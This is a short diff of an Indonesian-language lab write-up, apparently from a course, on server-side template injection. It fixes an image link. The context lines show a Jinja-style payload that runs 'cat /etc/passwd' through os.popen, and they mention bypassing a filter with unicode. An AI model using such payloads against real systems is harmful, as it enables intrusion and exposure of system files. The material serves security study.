@@ -26,7 +26,7 @@ Aplikasi menggunakan template engine yang tidak melakukan sanitasi input dengan 
    {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
    ```
 
-   ![Eksploitasi File]([SSTI1/SSTI1.3.png](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.3.png))
+   ![Eksploitasi File](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.3.png)
    
 5. Ternyata payload diatas telah terblok karena beberapa tanda, cara untuk mengelabuinya adalah menggunakan unicode.
    ```
@@ -52,3 +52,4 @@ Aplikasi menggunakan template engine yang tidak melakukan sanitasi input dengan 
 
 
 - [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+
